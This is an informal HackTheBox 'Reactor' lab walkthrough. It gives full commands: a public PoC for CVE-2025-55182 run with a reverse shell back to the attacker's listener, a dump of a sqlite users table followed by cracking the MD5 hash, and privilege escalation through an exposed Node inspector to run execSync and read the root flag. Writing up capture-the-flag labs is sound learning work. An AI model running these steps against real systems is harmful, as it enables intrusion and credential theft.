Hackthebox reactor

![[Screenshot_20260526_202415.png]]
I found a critical vulnerability via research `CVE-2025-55182`
``` 
https://github.com/ZemarKhos/CVE-2025-55182-Exploit-PoC-Scanner
```

 contains the exploit we need to use
 https://github.com/p3ta00/react2shell-poc 
 this was found out to be working out here so I used the command 
```
 python3 react2shell-poc.py -t http://10.129.15.150:3000 --revshell --lhost 10.10.14.168 --lport 4444
```
this gave me reverse shell. 
I got into the node shell 
```
sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
```

this worked out hereI got in there and I found a md5 hash I cracked it and passwrod was found out to be reactor1.
I found the user flag out there.


#### Privilege Escalation
```
ps aux
``` 
I used this command to check the currently running processes and as I knew that this is a node based one so I tried greping the node one and I found out the process running out here 
```
grep node
```

```
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js 
```
using this I inspected the file I got this via google and AI. 

I got into the node using 
``` 
node inspect 127.0.0.1:9229
```
and found out that I had the root privilage 
```
exec("process.getuid()")
```


```
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```
using this command I could get the root flag and complete this challenge 
